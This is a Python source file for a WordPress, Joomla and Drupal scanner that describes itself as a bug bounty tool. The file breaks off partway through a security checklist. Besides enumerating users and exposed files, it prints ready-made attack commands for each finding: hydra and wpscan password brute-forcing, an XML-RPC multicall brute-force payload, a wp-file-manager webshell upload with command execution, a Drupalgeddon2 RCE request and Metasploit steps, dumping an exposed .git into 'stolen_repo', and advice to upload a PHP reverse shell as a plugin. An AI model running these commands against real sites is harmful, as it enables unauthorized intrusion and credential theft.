#!/usr/bin/env python3
"""
==============================================================================
  fitijoe WordPress & CMS Deep Scanner v1.0
  Author : fitijoe (MohamedSuleiman)
  GitHub : https://github.com/fitijoe
  Purpose: Deep WordPress & CMS Security Scanner for Bug Bounty Hunters
  Scans  : WordPress · Joomla · Drupal · Plugin Vulns · Theme Vulns
           User Enumeration · Config Exposure · XML-RPC · REST API
           Exploit Guidance · Professional Report
  Legal  : For authorized security testing ONLY
==============================================================================
"""

import subprocess
import sys
import os
import re
import json
import argparse
import shutil
import time
from datetime import datetime

# ─── Colors ───────────────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BLUE    = "\033[94m"
    WHITE   = "\033[97m"
    DIM     = "\033[2m"

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    print(f"""
{C.CYAN}{C.BOLD}
 __    __ ___  ____  ____  ____  ____  ____  ____  _____ ____
 \ \  / // _ \|  _ \|  _ \|  _ \|  _ \|  __|/ ___||  ___/ ___|
  \ \/ /| | | | |_) | | | | |_) | |_) |  _| \___ \|  _| \___ \\
   \  / | |_| |  _ <| |_| |  __/|  _ <| |___ ___) || |___ ___) |
    \/   \___/|_| \_\____/|_|   |_| \_\_____|____/ |_____|____/
{C.RED}
  ____  __  __ ____    ____   ____    _    _   _ _   _ _____ ____
 / ___||  \/  / ___|  / ___| / ___|  / \  | \ | | \ | | ____|  _ \\
| |    | |\/| \___ \  \___ \| |     / _ \ |  \| |  \| |  _| | |_) |
| |___ | |  | |___) |  ___) | |___ / ___ \| |\  | |\  | |___|  _ <
 \____||_|  |_|____/  |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\\
{C.RESET}
{C.DIM}  ─────────────────────────────────────────────────────────────────────
   fitijoe WordPress & CMS Deep Scanner v1.0
   Author : fitijoe (MohamedSuleiman)
   GitHub : https://github.com/fitijoe
   Scans  : CMS Detection · Plugin/Theme Vulns · User Enum
            Config Exposure · XML-RPC · REST API · Exploit Guidance
   Legal  : Authorized security testing ONLY
  ─────────────────────────────────────────────────────────────────────{C.RESET}
""")

# ─── Helpers ──────────────────────────────────────────────────────────────────
def section(title):
    w = 70
    print(f"\n{C.CYAN}{C.BOLD}{'═'*w}\n  {title}\n{'═'*w}{C.RESET}\n")

def info(msg):   print(f"  {C.BLUE}[*]{C.RESET} {msg}")
def ok(msg):     print(f"  {C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):   print(f"  {C.YELLOW}[!]{C.RESET} {msg}")
def vuln(msg):   print(f"  {C.RED}[VULN]{C.RESET} {C.BOLD}{msg}{C.RESET}")
def found(msg):  print(f"  {C.MAGENTA}[FOUND]{C.RESET} {msg}")
def skip(msg):   print(f"  {C.DIM}[SKIP] {msg}{C.RESET}")

def run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def has(tool): return shutil.which(tool) is not None

def curl(url, timeout=15, extra=""):
    return run(f"curl -skL --max-time {timeout} {extra} '{url}' -A 'Mozilla/5.0'", timeout+5)

def curl_code(url, extra=""):
    return run(f"curl -sk -o /dev/null -w '%{{http_code}}' --max-time 10 {extra} '{url}'", 15).strip()

def curl_head(url):
    return run(f"curl -skI --max-time 10 '{url}' -A 'Mozilla/5.0'", 15)

# ─── Tool Check ───────────────────────────────────────────────────────────────
def check_tools():
    section("TOOL CHECK")
    required = ["curl"]
    optional = ["wpscan", "nikto", "gobuster", "ffuf", "hydra", "whatweb"]

    missing = [t for t in required if not has(t)]
    if missing:
        warn(f"Missing required: {', '.join(missing)}")
        sys.exit(1)
    ok(f"Required tools ready: {', '.join(required)}")

    found_opt, absent = [], []
    for t in optional:
        (found_opt if has(t) else absent).append(t)
    if found_opt:  ok(f"Optional found : {', '.join(found_opt)}")
    if absent:
        warn(f"Optional missing: {', '.join(absent)}")
        print(f"  {C.DIM}sudo apt install wpscan nikto gobuster ffuf hydra whatweb -y{C.RESET}\n")
    return found_opt

# ─── PHASE 1: CMS DETECTION ───────────────────────────────────────────────────
def phase_cms_detect(url, opt):
    section("PHASE 1 — CMS DETECTION & FINGERPRINTING")
    cms_info = {'cms': None, 'version': None, 'plugins': [], 'themes': []}

    # WhatWeb
    if 'whatweb' in opt:
        info("whatweb — technology fingerprinting...")
        ww = run(f"whatweb -a 3 --colour=never {url} 2>/dev/null", 30)
        print(f"{C.DIM}{ww[:1000]}{C.RESET}")

    # WordPress detection
    info("Detecting CMS type...")
    wp_indicators = [
        '/wp-login.php', '/wp-admin/', '/wp-content/', '/wp-includes/',
        '/xmlrpc.php', '/wp-json/'
    ]
    wp_score = 0
    for indicator in wp_indicators:
        code = curl_code(f"{url}{indicator}")
        if code in ('200', '301', '302', '403'):
            wp_score += 1

    # Check page source for WordPress
    page = curl(url, 10)
    if 'wp-content' in page or 'wp-includes' in page:
        wp_score += 2
    if 'WordPress' in page:
        wp_score += 2

    # Joomla detection
    joomla_indicators = ['/administrator/', '/components/', '/modules/', '/templates/']
    joomla_score = sum(1 for i in joomla_indicators if curl_code(f"{url}{i}") in ('200','301','302','403'))
    if 'Joomla' in page or 'joomla' in page:
        joomla_score += 2

    # Drupal detection
    drupal_indicators = ['/sites/default/', '/core/', '/modules/', '?q=node']
    drupal_score = sum(1 for i in drupal_indicators if curl_code(f"{url}{i}") in ('200','301','302','403'))
    if 'Drupal' in page or 'drupal' in page.lower():
        drupal_score += 2

    # Determine CMS
    if wp_score >= 3:
        cms_info['cms'] = 'WordPress'
        found(f"CMS detected: {C.BOLD}WordPress{C.RESET} (confidence score: {wp_score})")

        # Get WordPress version
        ver_locations = [
            f"{url}/feed/",
            f"{url}/wp-login.php",
            f"{url}/readme.html",
            f"{url}/license.txt",
        ]
        for loc in ver_locations:
            content = curl(loc, 10)
            ver_match = re.search(r'WordPress (\d+\.\d+[\.\d]*)', content)
            if ver_match:
                version = ver_match.group(1)
                cms_info['version'] = version
                ok(f"WordPress version: {C.BOLD}{version}{C.RESET}")
                # Check if outdated
                try:
                    latest = curl("https://api.wordpress.org/core/version-check/1.7/", 10)
                    latest_json = json.loads(latest)
                    latest_ver = latest_json.get('offers', [{}])[0].get('version', 'unknown')
                    if version != latest_ver:
                        vuln(f"WordPress {version} is OUTDATED — latest is {latest_ver}")
                except:
                    pass
                break

    elif joomla_score >= 2:
        cms_info['cms'] = 'Joomla'
        found(f"CMS detected: {C.BOLD}Joomla{C.RESET}")
    elif drupal_score >= 2:
        cms_info['cms'] = 'Drupal'
        found(f"CMS detected: {C.BOLD}Drupal{C.RESET}")
    else:
        warn("No known CMS detected — may be custom built")
        cms_info['cms'] = 'Unknown'

    # Headers analysis
    info("Analyzing HTTP headers...")
    headers = curl_head(url)
    print(f"{C.DIM}{headers[:500]}{C.RESET}")

    # Check for version disclosure in headers
    for header in ['x-powered-by', 'server', 'x-generator', 'x-drupal-cache']:
        for line in headers.splitlines():
            if header in line.lower():
                found(f"Version disclosure in header: {line.strip()}")

    return cms_info

# ─── PHASE 2: WORDPRESS DEEP SCAN ────────────────────────────────────────────
def phase_wordpress_scan(url, opt):
    section("PHASE 2 — WORDPRESS DEEP VULNERABILITY SCAN")
    vulns = []

    # ── WPScan ───────────────────────────────────────────────────────────────
    if 'wpscan' in opt:
        info("wpscan — comprehensive WordPress vulnerability scanner...")
        wp = run(
            f"wpscan --url {url} --no-banner --disable-tls-checks "
            f"--enumerate p,t,u,m --plugins-detection aggressive 2>/dev/null",
            300)
        print(f"{C.DIM}{wp[:5000]}{C.RESET}")
        for line in wp.splitlines():
            if any(k in line.lower() for k in ['vulnerability','vulnerabilities','cve','exploit']):
                vuln(f"WPScan: {line.strip()}")
                vulns.append(('WPSCAN_VULN', line.strip()))
    else:
        warn("wpscan not installed — running manual checks instead")
        warn("Install: sudo apt install wpscan -y  OR  gem install wpscan")

    # ── User Enumeration ─────────────────────────────────────────────────────
    info("Enumerating WordPress users...")
    users = set()

    # REST API user enumeration
    rest_users = curl(f"{url}/wp-json/wp/v2/users", 15)
    try:
        users_json = json.loads(rest_users)
        if isinstance(users_json, list) and users_json:
            vuln(f"User enumeration via REST API — {len(users_json)} users found!")
            vulns.append(('WP_USER_ENUM', f'HIGH: {len(users_json)} users exposed via REST API'))
            for u in users_json:
                username = u.get('slug', u.get('name', ''))
                name     = u.get('name', '')
                users.add(username)
                found(f"User: {C.BOLD}{username}{C.RESET} ({name})")
    except:
        ok("REST API user enumeration blocked")

    # ?author= enumeration
    info("Testing ?author= user enumeration...")
    for i in range(1, 6):
        resp = run(f"curl -sk -o /dev/null -w '%{{url_effective}}' -L '{url}/?author={i}' --max-time 10", 15)
        if '/author/' in resp:
            username = re.search(r'/author/([^/]+)', resp)
            if username:
                user = username.group(1)
                users.add(user)
                found(f"User via ?author={i}: {C.BOLD}{user}{C.RESET}")
                vuln(f"User enumeration via ?author= parameter!")
                vulns.append(('WP_AUTHOR_ENUM', f'MEDIUM: User enumeration via ?author='))

    if users:
        ok(f"Total users found: {list(users)}")

    # ── XML-RPC ──────────────────────────────────────────────────────────────
    info("Testing XML-RPC endpoint...")
    xmlrpc_code = curl_code(f"{url}/xmlrpc.php")
    xmlrpc_resp = curl(f"{url}/xmlrpc.php", 10)

    if xmlrpc_code == '200':
        vuln("xmlrpc.php is accessible!")
        vulns.append(('XMLRPC_ACCESSIBLE', 'HIGH: xmlrpc.php accessible'))

        # Test listMethods
        methods_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        methods_resp = run(
            f"curl -sk -X POST '{url}/xmlrpc.php' "
            f"-d '{methods_payload}' --max-time 10", 15)
        if 'wp.getUsersBlogs' in methods_resp or 'methodResponse' in methods_resp:
            vuln("XML-RPC listMethods enabled — brute-force amplification possible!")
            vulns.append(('XMLRPC_METHODS', 'HIGH: XML-RPC listMethods enabled'))

        # Test multicall brute-force
        info("Testing XML-RPC multicall (brute-force amplification)...")
        multicall = '''<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>wrongpassword</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param></params></methodCall>'''
        mc_resp = run(
            f"curl -sk -X POST '{url}/xmlrpc.php' "
            f"--data '{multicall}' --max-time 10", 15)
        if 'faultCode' in mc_resp or 'methodResponse' in mc_resp:
            vuln("XML-RPC multicall works — can test 100s of passwords per request!")
            vulns.append(('XMLRPC_MULTICALL', 'CRITICAL: XML-RPC multicall brute-force'))

    # ── Sensitive File Exposure ───────────────────────────────────────────────
    info("Checking for exposed sensitive files...")
    sensitive_files = [
        ('/wp-config.php',          'WordPress config — DB credentials'),
        ('/wp-config.php.bak',      'WordPress config backup'),
        ('/wp-config.php~',         'WordPress config swap file'),
        ('/wp-config-sample.php',   'Sample config — may have credentials'),
        ('/.htaccess',              'Apache config exposed'),
        ('/readme.html',            'WordPress readme — reveals version'),
        ('/license.txt',            'License file — reveals version'),
        ('/debug.log',              'Debug log exposed'),
        ('/wp-content/debug.log',   'WordPress debug log'),
        ('/wp-content/uploads/',    'Uploads directory listing'),
        ('/wp-includes/',           'WordPress includes directory'),
        ('/wp-admin/install.php',   'WordPress install script accessible'),
        ('/wp-admin/upgrade.php',   'WordPress upgrade script accessible'),
        ('/.git/HEAD',              'Git repository exposed'),
        ('/.env',                   '.env file exposed'),
        ('/wp-cron.php',            'WordPress cron accessible'),
        ('/wp-links-opml.php',      'WordPress OPML — user/version info'),
        ('/wp-mail.php',            'WordPress mail script accessible'),
        ('/wp-trackback.php',       'Trackback enabled'),
        ('/wp-content/plugins/',    'Plugin directory listing'),
        ('/wp-content/themes/',     'Theme directory listing'),
    ]

    for path, desc in sensitive_files:
        code = curl_code(f"{url}{path}")
        if code in ('200', '301', '302', '403'):
            if code == '200':
                vuln(f"[{code}] {path} — {desc}")
                vulns.append(('WP_EXPOSED_FILE', f'HIGH: {path} accessible — {desc}'))
            else:
                found(f"[{code}] {path} — {desc}")
        else:
            print(f"      {C.DIM}[{code}] {path}{C.RESET}")

    # ── Admin & Login ────────────────────────────────────────────────────────
    info("Testing admin and login pages...")
    admin_paths = [
        '/wp-admin/', '/wp-login.php', '/admin/', '/login/',
        '/wp-admin/admin-ajax.php', '/dashboard/'
    ]
    for path in admin_paths:
        code = curl_code(f"{url}{path}")
        if code in ('200', '302'):
            found(f"[{code}] {path}")
            if 'login' in path.lower() or 'admin' in path.lower():
                vulns.append(('WP_LOGIN_EXPOSED', f'INFO: {path} accessible'))

    # ── Plugin & Theme Detection ──────────────────────────────────────────────
    info("Detecting installed plugins...")
    plugins_found = []
    common_plugins = [
        'contact-form-7', 'woocommerce', 'elementor', 'yoast-seo',
        'wpforms-lite', 'akismet', 'all-in-one-wp-migration',
        'really-simple-ssl', 'jetpack', 'mailchimp-for-wp',
        'advanced-custom-fields', 'updraftplus', 'wordfence',
        'wp-super-cache', 'w3-total-cache', 'nextgen-gallery',
        'ninja-forms', 'gravityforms', 'buddypress', 'bbpress',
        'the-events-calendar', 'wp-mail-smtp', 'duplicator',
        'essential-addons-for-elementor', 'beaver-builder',
        'divi', 'revolution-slider', 'layer-slider',
        'wp-file-manager', 'ultimate-member', 'memberpress',
        'download-manager', 'wp-fastest-cache',
    ]
    for plugin in common_plugins:
        code = curl_code(f"{url}/wp-content/plugins/{plugin}/")
        if code in ('200', '403'):
            plugins_found.append(plugin)
            found(f"Plugin detected: {C.BOLD}{plugin}{C.RESET} [{code}]")
            # Check for readme to get version
            readme = curl(f"{url}/wp-content/plugins/{plugin}/readme.txt", 8)
            ver_m = re.search(r'Stable tag:\s*([\d.]+)', readme, re.I)
            if ver_m:
                print(f"      {C.DIM}Version: {ver_m.group(1)}{C.RESET}")

    if plugins_found:
        ok(f"Total plugins found: {len(plugins_found)}")
        vulns.append(('WP_PLUGINS', f'INFO: {len(plugins_found)} plugins detected'))

    # Check for known vulnerable plugins
    info("Checking for known vulnerable plugin versions...")
    vuln_plugins = {
        'wp-file-manager':    ('6.0-6.9', 'RCE — No auth required CVE-2020-25213'),
        'duplicator':         ('1.3.26', 'Arbitrary file read CVE-2020-11738'),
        'contact-form-7':     ('5.3.1', 'Unrestricted file upload'),
        'revolution-slider':  ('4.1-4.9', 'LFI CVE-2014-9734'),
        'layer-slider':       ('5.6.5', 'SQL injection'),
        'download-manager':   ('2.9.94', 'Authenticated RCE'),
        'ultimate-member':    ('2.1.3', 'Privilege escalation CVE-2023-3460'),
        'wp-mail-smtp':       ('3.9.0', 'Sensitive data exposure'),
    }
    for plugin, (ver, issue) in vuln_plugins.items():
        if plugin in plugins_found:
            readme = curl(f"{url}/wp-content/plugins/{plugin}/readme.txt", 8)
            ver_m = re.search(r'Stable tag:\s*([\d.]+)', readme, re.I)
            if ver_m:
                vuln(f"Potentially vulnerable plugin: {plugin} v{ver_m.group(1)} — {issue}")
                vulns.append(('WP_VULN_PLUGIN', f'CRITICAL: {plugin} — {issue}'))

    # ── Theme Detection ───────────────────────────────────────────────────────
    info("Detecting active theme...")
    page_source = curl(url, 10)
    theme_match = re.search(r'/wp-content/themes/([^/]+)/', page_source)
    if theme_match:
        theme = theme_match.group(1)
        found(f"Active theme: {C.BOLD}{theme}{C.RESET}")
        # Check theme version
        theme_readme = curl(f"{url}/wp-content/themes/{theme}/style.css", 8)
        ver_m = re.search(r'Version:\s*([\d.]+)', theme_readme)
        if ver_m:
            print(f"      {C.DIM}Version: {ver_m.group(1)}{C.RESET}")
        vulns.append(('WP_THEME', f'INFO: Active theme: {theme}'))

    # ── Security Headers ──────────────────────────────────────────────────────
    info("Checking WordPress security headers...")
    headers = curl_head(url)
    for h, desc in [
        ('x-frame-options',        'Clickjacking protection missing'),
        ('content-security-policy','CSP missing — XSS risk'),
        ('x-content-type-options', 'MIME sniffing protection missing'),
        ('strict-transport-security','HSTS missing'),
    ]:
        if h not in headers.lower():
            vuln(desc)
            vulns.append(('WP_MISSING_HEADER', f'MEDIUM: {desc}'))

    # ── Login Brute-force Check ───────────────────────────────────────────────
    info("Checking login page for brute-force protection...")
    login_resp = curl(f"{url}/wp-login.php", 10)
    if 'login_error' not in login_resp and 'Too many' not in login_resp:
        warn("No obvious brute-force protection on login page")
        vulns.append(('WP_NO_RATE_LIMIT', 'MEDIUM: No rate limiting on wp-login.php'))

    return vulns, plugins_found, list(users) if 'users' in dir() else []

# ─── PHASE 3: JOOMLA SCAN ────────────────────────────────────────────────────
def phase_joomla_scan(url):
    section("PHASE 2 — JOOMLA DEEP SCAN")
    vulns = []

    # Joomla version
    info("Detecting Joomla version...")
    ver_files = ['/administrator/manifests/files/joomla.xml', '/language/en-GB/en-GB.xml']
    for vf in ver_files:
        content = curl(f"{url}{vf}", 10)
        ver_m = re.search(r'<version>([\d.]+)</version>', content)
        if ver_m:
            found(f"Joomla version: {C.BOLD}{ver_m.group(1)}{C.RESET}")
            break

    # Sensitive files
    joomla_sensitive = [
        ('/administrator/',              'Admin panel accessible'),
        ('/configuration.php',           'Joomla config exposed'),
        ('/configuration.php.bak',       'Joomla config backup'),
        ('/htaccess.txt',                'htaccess.txt exposed'),
        ('/README.txt',                  'README reveals version'),
        ('/web.config.txt',              'web.config exposed'),
        ('/administrator/logs/',         'Admin logs exposed'),
        ('/cache/',                      'Cache directory accessible'),
        ('/tmp/',                        'Temp directory accessible'),
    ]
    for path, desc in joomla_sensitive:
        code = curl_code(f"{url}{path}")
        if code in ('200', '301', '403'):
            vuln(f"[{code}] {path} — {desc}")
            vulns.append(('JOOMLA_EXPOSED', f'HIGH: {path} — {desc}'))
        else:
            print(f"      {C.DIM}[{code}] {path}{C.RESET}")

    return vulns

# ─── PHASE 4: DRUPAL SCAN ────────────────────────────────────────────────────
def phase_drupal_scan(url):
    section("PHASE 2 — DRUPAL DEEP SCAN")
    vulns = []

    # Drupal version
    info("Detecting Drupal version...")
    changelog = curl(f"{url}/CHANGELOG.txt", 10)
    ver_m = re.search(r'Drupal (\d+\.\d+)', changelog)
    if ver_m:
        found(f"Drupal version: {C.BOLD}{ver_m.group(1)}{C.RESET}")
        # Check for Drupalgeddon
        ver_num = float(ver_m.group(1))
        if ver_num < 7.58:
            vuln("Drupalgeddon2 (CVE-2018-7600) — Remote Code Execution!")
            vulns.append(('DRUPALGEDDON2', 'CRITICAL: Drupalgeddon2 RCE'))
        if ver_num < 7.32:
            vuln("Drupalgeddon (CVE-2014-3704) — SQL Injection!")
            vulns.append(('DRUPALGEDDON', 'CRITICAL: Drupalgeddon SQL Injection'))

    drupal_sensitive = [
        ('/CHANGELOG.txt',      'Version disclosure'),
        ('/INSTALL.txt',        'Install file exposed'),
        ('/README.txt',         'README exposed'),
        ('/sites/default/files/','Files directory accessible'),
        ('/user/login',         'Login page accessible'),
        ('/admin/',             'Admin panel accessible'),
        ('/update.php',         'Update script accessible'),
        ('/install.php',        'Install script accessible'),
    ]
    for path, desc in drupal_sensitive:
        code = curl_code(f"{url}{path}")
        if code in ('200','301','403'):
            vuln(f"[{code}] {path} — {desc}")
            vulns.append(('DRUPAL_EXPOSED', f'HIGH: {path} — {desc}'))

    return vulns

# ─── PHASE 5: EXPLOIT GUIDANCE ───────────────────────────────────────────────
def phase_exploit(vulns, url, users, plugins):
    section("PHASE 3 — EXPLOITATION GUIDANCE & COMMANDS")

    if not vulns:
        ok("No significant vulnerabilities found.")
        return

    EXPLOITS = {
        'XMLRPC_MULTICALL': {
            'sev': 'CRITICAL', 'name': 'XML-RPC Multicall — Brute-Force Amplification',
            'desc': 'XML-RPC multicall lets you test hundreds of passwords in a single HTTP request — 100x faster than regular login brute-force.',
            'cmds': [
                "# Full WordPress brute-force with wpscan",
                f"wpscan --url {url} --no-banner \\",
                f"       --passwords /usr/share/wordlists/rockyou.txt \\",
                f"       --usernames {','.join(users) if users else 'admin'} \\",
                "       --max-threads 20",
                "",
                "# Manual multicall brute-force",
                f"curl -sk -X POST {url}/xmlrpc.php \\",
                "  -d '<?xml version=\"1.0\"?><methodCall>",
                "  <methodName>system.multicall</methodName>",
                "  <params><param><value><array><data>",
                "  <value><struct>",
                "  <member><name>methodName</name>",
                "  <value><string>wp.getUsersBlogs</string></value></member>",
                "  <member><name>params</name><value><array><data>",
                "  <value><string>admin</string></value>",
                "  <value><string>PASSWORD</string></value>",
                "  </data></array></value></member>",
                "  </struct></value>",
                "  </data></array></value></param></params></methodCall>'",
                "",
                "# Also brute-force with hydra",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt \\",
                f"      {url.replace('http://','').replace('https://','')} http-post-form \\",
                "      '/wp-login.php:log=^USER^&pwd=^PASS^:ERROR'",
            ],
            'fix': "Disable XML-RPC if not needed. Add to .htaccess:\n    <Files xmlrpc.php>\n      Order Deny,Allow\n      Deny from all\n    </Files>"
        },
        'WP_USER_ENUM': {
            'sev': 'HIGH', 'name': 'WordPress User Enumeration',
            'desc': 'WordPress exposes usernames via REST API and ?author= parameter — attackers can collect all usernames then brute-force passwords.',
            'cmds': [
                "# Enumerate via REST API",
                f"curl -sk {url}/wp-json/wp/v2/users | python3 -m json.tool",
                "",
                "# Enumerate via ?author= parameter",
                f"for i in $(seq 1 10); do",
                f"  curl -sk -L '{url}/?author='$i | grep -o 'author/[^/]*' | head -1",
                "done",
                "",
                "# Use wpscan for enumeration",
                f"wpscan --url {url} --enumerate u --no-banner",
                "",
                f"# Once you have usernames — brute-force login",
                f"wpscan --url {url} --passwords /usr/share/wordlists/rockyou.txt \\",
                f"       --usernames {','.join(users) if users else 'admin'}",
            ],
            'fix': "Add to functions.php:\n    add_filter('rest_endpoints', function($endpoints) {\n      unset($endpoints['/wp/v2/users']);\n      return $endpoints;\n    });"
        },
        'WP_VULN_PLUGIN': {
            'sev': 'CRITICAL', 'name': 'Vulnerable WordPress Plugin',
            'desc': 'Outdated or vulnerable plugins are the #1 cause of WordPress compromises.',
            'cmds': [
                "# Check plugin version",
                f"curl -sk {url}/wp-content/plugins/PLUGIN_NAME/readme.txt | grep -i 'stable tag'",
                "",
                "# Search for exploits",
                "searchsploit wordpress PLUGIN_NAME",
                "searchsploit -w wordpress PLUGIN_NAME",
                "",
                "# Use Metasploit",
                "msfconsole -q",
                "search type:exploit name:wordpress PLUGIN_NAME",
                "",
                "# wp-file-manager RCE example (CVE-2020-25213)",
                f"curl -sk -X POST {url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \\",
                "  -F 'cmd=upload' -F 'target=l1_Lw' \\",
                "  -F 'upload[]=@shell.php;type=image/png' \\",
                "  -F 'mimes[]=image'",
                "",
                "# After upload — access shell",
                f"curl -sk '{url}/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id'",
            ],
            'fix': "Update all plugins immediately. Delete unused plugins. Use Wordfence for monitoring."
        },
        'WP_EXPOSED_FILE': {
            'sev': 'HIGH', 'name': 'WordPress Sensitive File Exposed',
            'desc': 'Critical WordPress files are publicly accessible — may expose credentials and configuration.',
            'cmds': [
                "# Read WordPress config (if accessible)",
                f"curl -sk {url}/wp-config.php",
                f"curl -sk {url}/wp-config.php.bak",
                "",
                "# Read debug log",
                f"curl -sk {url}/wp-content/debug.log",
                f"curl -sk {url}/debug.log",
                "",
                "# Check uploads for webshells",
                f"curl -sk {url}/wp-content/uploads/",
                "",
                "# Read git repository",
                f"git-dumper {url}/.git ./stolen_repo",
                "cd stolen_repo && git log --all",
                "git grep -i 'password\\|secret\\|key'",
                "",
                "# Read .env file",
                f"curl -sk {url}/.env",
            ],
            'fix': "Block access to sensitive files in .htaccess:\n    <FilesMatch '(wp-config\\.php|\\.env|\\.git)'>\n      Deny from all\n    </FilesMatch>"
        },
        'WP_NO_RATE_LIMIT': {
            'sev': 'HIGH', 'name': 'No Rate Limiting on Login Page',
            'desc': 'WordPress login page has no brute-force protection — unlimited password attempts allowed.',
            'cmds': [
                "# Brute-force WordPress login",
                f"wpscan --url {url} --no-banner \\",
                f"       --passwords /usr/share/wordlists/rockyou.txt \\",
                f"       --usernames {','.join(users) if users else 'admin'} \\",
                "       --max-threads 10",
                "",
                "# Brute-force with hydra",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt \\",
                f"      -s 80 {url.replace('http://','').split('/')[0]} http-post-form \\",
                "      '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR'",
                "",
                "# Once logged in — install a plugin shell",
                "# Dashboard → Plugins → Add New → Upload Plugin",
                "# Upload a PHP reverse shell as a .zip file",
                f"# Then access: {url}/wp-content/plugins/shell/shell.php",
            ],
            'fix': "Install Limit Login Attempts Reloaded plugin. Use Wordfence firewall. Enable 2FA."
        },
        'DRUPALGEDDON2': {
            'sev': 'CRITICAL', 'name': 'Drupalgeddon2 — Remote Code Execution (CVE-2018-7600)',
            'desc': 'Critical Drupal RCE vulnerability — unauthenticated attacker can execute any command on the server.',
            'cmds': [
                "# Test with curl",
                f"curl -sk '{url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \\",
                "  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'",
                "",
                "# Use Python exploit",
                "searchsploit drupalgeddon2",
                "python3 44449.py http://TARGET",
                "",
                "# Metasploit",
                "msfconsole -q",
                "use exploit/unix/webapp/drupal_drupalgeddon2",
                f"set RHOSTS {url.replace('http://','').replace('https://','').split('/')[0]}",
                "run",
            ],
            'fix': "Update Drupal to 7.58+ or 8.5.1+ immediately. Apply security patches."
        },
        'DRUPAL_EXPOSED': {
            'sev': 'HIGH', 'name': 'Drupal Sensitive File Exposed',
            'desc': 'Drupal configuration and version files are publicly accessible.',
            'cmds': [
                f"curl -sk {url}/CHANGELOG.txt | head -5",
                f"curl -sk {url}/sites/default/settings.php",
                f"curl -sk {url}/sites/default/files/",
                "",
                "# Check for default credentials",
                f"curl -sk -X POST {url}/user/login \\",
                "  -d 'name=admin&pass=admin&form_id=user_login_form&op=Log+in'",
            ],
            'fix': "Block access to text files in .htaccess. Move settings.php outside web root."
        },
        'JOOMLA_EXPOSED': {
            'sev': 'HIGH', 'name': 'Joomla Sensitive Files Exposed',
            'desc': 'Joomla configuration and admin files are accessible.',
            'cmds': [
                f"curl -sk {url}/administrator/",
                f"curl -sk {url}/configuration.php",
                "",
                "# Brute-force Joomla admin",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt \\",
                f"      {url.replace('http://','').split('/')[0]} http-post-form \\",
                "      '/administrator/index.php:username=^USER^&passwd=^PASS^:Login failed'",
                "",
                "# Search for Joomla exploits",
                "searchsploit joomla",
            ],
            'fix': "Restrict admin directory by IP. Update Joomla to latest version. Use 2FA."
        },
        'WP_MISSING_HEADER': {
            'sev': 'MEDIUM', 'name': 'Missing Security Headers',
            'desc': 'WordPress site missing important security headers.',
            'cmds': [
                f"curl -skI {url}",
                "",
                "# Test XSS without CSP",
                f"curl -sk '{url}/?s=<script>alert(1)</script>' | grep -i script",
                "",
                "# Test clickjacking",
                "cat > wp_clickjack.html << 'EOF'",
                "<html><body>",
                f"<iframe src='{url}' style='opacity:0.3;width:100%;height:100%'></iframe>",
                "</body></html>",
                "EOF",
                "firefox wp_clickjack.html",
            ],
            'fix': "Add to .htaccess:\n    Header always set X-Frame-Options DENY\n    Header always set X-Content-Type-Options nosniff\n    Header always set X-XSS-Protection '1; mode=block'"
        },
    }

    shown = set()
    sev_colors = {'CRITICAL': C.RED, 'HIGH': C.YELLOW, 'MEDIUM': C.BLUE, 'LOW': C.DIM}

    for vuln_type, desc in vulns:
        for key, ex in EXPLOITS.items():
            if key == vuln_type and key not in shown:
                shown.add(key)
                sc = sev_colors.get(ex['sev'], C.WHITE)
                print(f"\n  {'─'*68}")
                print(f"  {C.MAGENTA}{C.BOLD}▶ {ex['name']}{C.RESET}  {sc}[{ex['sev']}]{C.RESET}")
                print(f"  {'─'*68}")
                print(f"\n  {C.WHITE}What it means:{C.RESET}")
                print(f"    {ex['desc']}")
                print(f"\n  {C.MAGENTA}Exploit Commands:{C.RESET}")
                for cmd in ex['cmds']:
                    if cmd == "":
                        print()
                    elif cmd.startswith('#'):
                        print(f"    {C.DIM}{cmd}{C.RESET}")
                    else:
                        print(f"    {C.GREEN}$ {cmd}{C.RESET}")
                print(f"\n  {C.CYAN}How to fix:{C.RESET}")
                print(f"    {ex['fix']}")
                print()

    # ── WordPress Security Checklist ──────────────────────────────────────────
    section("WORDPRESS SECURITY CHECKLIST — FOR YOUR BUG BOUNTY REPORT")
    checks = [
        ("WordPress version up to date",           "Update to latest WordPress"),
        ("All plugins up to date",                 "Update or delete unused plugins"),
        ("All themes up to date",                  "Update or delete unused themes"),
        ("XML-RPC disabled",                       "Block xmlrpc.php in .htaccess"),
        ("User enumeration blocked",               "Remove users from REST API"),
        ("Login rate limiting enabled",            "Install limit login attempts plugin"),
        ("wp-config.php protected",               "Block wp-config.php access"),
        ("Debug mode disabled",                    "Set WP_DEBUG to false"),
        ("File editing disabled",                  "Add DISALLOW_FILE_EDIT to wp-config.php"),
        ("Security headers configured",            "Add headers in .htaccess"),
        ("Two-factor authentication enabled",      "Install 2FA plugin"),
        ("Admin username not 'admin'",             "Rename default admin username"),
        ("Database prefix not wp_",               "Change default table prefix"),
        ("HTTPS enforced",                         "Force SSL in wp-config.php"),
